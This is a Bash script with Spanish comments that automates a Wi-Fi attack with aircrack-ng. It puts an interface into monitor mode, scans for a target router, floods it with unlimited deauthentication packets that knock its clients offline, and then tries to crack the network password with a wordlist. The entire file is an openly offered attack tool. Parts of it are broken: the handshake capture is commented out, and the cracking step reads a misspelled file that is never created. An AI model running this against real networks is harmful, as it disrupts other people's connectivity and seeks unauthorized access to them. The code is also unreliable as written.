#!/bin/bash

#Estilos
BOLD_RED="\e[1;31m"
BOLD_WHITE="\e[1;37m"
WHITE="\e[0;97m"
BOLD_PURPLE="\e[1;35m"
BOLD_YELLOW="\e[1;33m"
BOLD_BLUE="\e[1;36m"

#ZONA DE FUNCIONES

#Titulo del script
function titulo(){
    echo -e $BOLD_RED
    echo  " ______                        __                            __    __ "
    echo  "/\  _  \  __                  /\ \                          /\ \__/\ \ "
    echo  "\ \ \L\ \/\_\  ____           \_\ \    ____   ____    __  __\ \ ,_\ \ \____"
    echo  " \ \  __ \/\ \/\ __\ _______  /_   \  / __ \ / __ \  /\ \/\ \\\ \ \/\ \   _ \ "
    echo  "  \ \ \/\ \ \ \ \ \//\______\/\ \L\ \/\  __//\ \L\.\_\ \ \_\ \\\ \ \_\ \ \ \ \\ "
    echo  "   \ \_\ \_\ \_\ \_\\\/______/\ \___,_\ \____\ \__/.\_\\\ \____/ \ \__\\\ \_\ \_\ "
    echo  "    \/_/\/_/\/_/\/_/          \/__,_ /\/____/\/__/\/_/ \/___/   \/__/ \/_/\/_/  V 1.0"
    echo -e $WHITE
    echo  "---------------[ Deautentificador via Aircrack-ng por PabloVilallave ]---------------"
    echo  -e "-------------------[ Repo: $BOLD_WHITE https://github.com/Ousdeferro/Deauth$WHITE]--------------------\n"
}

#Muestra las diferentes interfaces inalambricas disponibles
RANGO=0
function w_interfaces(){
    OUTPUT=$(iw dev | awk '{if ($1=="Interface") print $2}')
    #OUTPUT="interface1 interface2"
    echo -e $WHITE
    if [ ${#OUTPUT} == 0 ]
    then
        echo -e "$BOLD_RED Error: $WHITE No se han encontrado interfaces inalambricas, no es posible continuar con el ataque"
    else
	for interface in ${OUTPUT}
	do
	    RANGO=$((RANGO+1))
	    echo -e "   $BOLD_WHITE $RANGO.$WHITE $interface"
	done
    fi
}

#Comprueba si la interface que elige es valida
#Si es un valor numerico y si este esta dentro del rango de interfaces
function is_number(){
    re='^[0-9]+$'
    IS=false
    if [[ $1 =~ $re ]]
    then
        if [ $1 -gt $RANGO ] || [ $1 -lt 1 ]
        then
            echo -e "$BOLD_RED Error: $WHITE El valor introducido esta fuera del rango"
	else
	    IS=true
        fi
    else
        echo -e "$BOLD_RED Error: $WHITE Introduce un valor numérico"
    fi
}


#Cambiar interfaz a modo promiscuo
function monitoring_mode(){
    #Matamos aquellos procesos que puedan dar problemas
    airmon-ng check kill
    #Ejecutamos modo monitoreo
    airmon-ng start $1
}

#Cambiare interface a modo normal
function manage_mode(){
    #ip link set $1 down
    #iw $1 set type managed
    #ip link set $1 up
    airmon-ng stop $1
}

#------------------------------------------------------------------------------------------------

#INICIO SCRIPT
titulo

#Mostramos interfaces inalambricas disponibles

echo -e $BOLD_BLUE
echo -e " Interfaces inalambricas disponibles:"
w_interfaces
echo ""

#---------------------------------------------

#Pedimos al usuario que elija una de las interfaces

ES_NUMERO=false
while [ "$ES_NUMERO" = false ]
do
    echo -e -n " Elige una interface $BOLD_WHITE\033[5m>\033[0m "
    read INTERFACE
    is_number $INTERFACE
    ES_NUMERO=$IS
done

#--------------------------------------------------

#Nos guardamos el nombre de la interfaz que ha decidido elegir

arr=(${OUTPUT})
INT_NAME=${arr[$INTERFACE-1]}

#-------------------------------------------------------------

#Pasamos interface a modo monitoreo

echo -e " $BOLD_RED$INT_NAME$WHITE va a pasar a modo monitoreo"
monitoring_mode $INT_NAME
INT_NAME="${INT_NAME}mon"

#----------------------------------

#Vamos a ver si el usuario ya sabe el bssid a atacar o no
SI_NO=test
while [[ "$SI_NO" != "S" && "$SI_NO" != "s" && "$SI_NO" != "n" && "$SI_NO" != "N" ]]
do
    echo -e -n " ¿Conoce el BSSID y canal del router que quiere atacar?(S/N) $BOLD_WHITE\033[5m>\033[0m "
    read SI_NO
done

if [[ "$SI_NO" == "S" || "$SI_NO" == "s" ]]
then
    echo -e -n " Introduce BBSID $BOLD_WHITE\033[5m>\033[0m "
    read BSSID
  
    echo -e -n " Introduce el canal $BOLD_WHITE\033[5m>\033[0m "
    read CANAL
else
    #Abrir ventana airodump
    timeout --foreground 4 airodump-ng -w info --output-format csv $INT_NAME
    echo ""
    echo -e -n " Introduce el nombre de la red que quieres atacar $BOLD_WHITE\033[5m>\033[0m "
    read RED
	
    #Extraer canal y BSSID
    LINEA=$(cat info-01.csv | grep $RED)
    IFS=', '
    read -a info <<< $LINEA
    CANAL=${info[5]}
    BSSID=${info[0]}
fi

#Mostramos informacion sobre el punto de acceso
echo ""
echo -e "$BOLD_BLUE Información sobre el punto de acceso:"
echo -e "$BOLD_WHITE BSSID: $WHITE$BSSID"
echo -e "$BOLD_WHITE Canal: $WHITE$CANAL"
rm info-01.csv

#Empezamos a capturar hasta encontrar el handshake
#screen -d -m airodump-ng -w handshake --output-format cap -c $CANAL --bssid $BSSID $INT_NAME

#Lanzamos el ataque (paquetes de deautentificacion)
echo -e "$BOLD_RED Enviando paquetes de deautentificacion"
aireplay-ng --deauth 0 -a $BSSID $INT_NAME


#Probamos a crackear la contraseña
echo -e -n "Introduce el nombre del wordlist $BOLD_WHITE\033[5m>\033[0m "
read WORDLIST

aircrack-ng hanshake-o1.cap -w $WORDLIST
manage_mode $INT_NAME

